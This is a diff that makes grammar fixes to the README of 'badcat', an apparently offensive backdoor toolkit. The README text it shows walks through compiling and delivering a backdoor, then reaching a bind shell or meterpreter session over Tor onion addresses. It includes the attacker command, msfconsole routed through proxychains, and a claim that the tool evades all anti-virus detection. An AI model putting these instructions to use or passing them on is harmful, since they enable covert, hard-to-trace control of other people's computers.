@@ -309,7 +309,7 @@ First translate your payload to hexadecimal. Then enable payload at your `settin
 
 Now compile your _backdoor_ and deliver as usual.
 
-When connecting the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your shell with using the onion address and the port as `settings.payload.bind_port` 4444 in our example.
+When connecting, the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your shell with using the onion address and the port as `settings.payload.bind_port` 4444 in our example.
 
 ```bash
 $ ./attacker -f hosts.json
@@ -326,7 +326,7 @@ Your payload should be accessible now at: andji3yvdyslric3yfgnj665xfybagiyfqjdeu
 
 ### 2. Connect through a meterpreter session
 
-Use meterpreter gives you a full-featured remote administration, but it's well known and blocked by most anti-viruses. With badcat, you evade all anti-virus detection because you only decrypt and execute the payload after the _attacker_ connects.
+Using meterpreter gives you a full-featured remote administration, but it's well known and blocked by most anti-viruses. With badcat, you evade all anti-virus detection because you only decrypt and execute the payload after the _attacker_ connects.
 
 The steps to use a meterpreter shellcode is exactly the same as in example 1.
 
@@ -365,7 +365,7 @@ Then enable payload at your `settings.json` and update them to reflect your payl
 
 Now compile your _backdoor_ and deliver as usual.
 
-When connecting the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your meterpreter session using the onion address and the port as `settings.payload.bind_port` 9999 in our example.
+When connecting, the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your meterpreter session using the onion address and the port as `settings.payload.bind_port` 9999 in our example.
 
 ```bash
 $ ./attacker -f hosts.json
@@ -380,7 +380,7 @@ connected to: Ip(0.0.0.0:0)
 Your payload should be accessible now at: aqti2jzrbmniqsnwmi3zmxxy3edynawa472ywdj42nk2wox6akpkodqd.onion:PAYLOAD_PORT
 ```
 
-After you have connected, fire up `msfconsole` using `proxychains` in order for open a meterpreter session through the Tor network. It's fundamental that msfconsole is proxied through the Tor network.
+After you have connected, fire up `msfconsole` using `proxychains` in order to open a meterpreter session through the Tor network. It's fundamental that msfconsole is proxied through the Tor network.
 
 ![Msfconsole opened with session from badcat](https://user-images.githubusercontent.com/28604565/143482772-40267d27-9e9e-4f41-80e9-c956e5432be0.png)
 
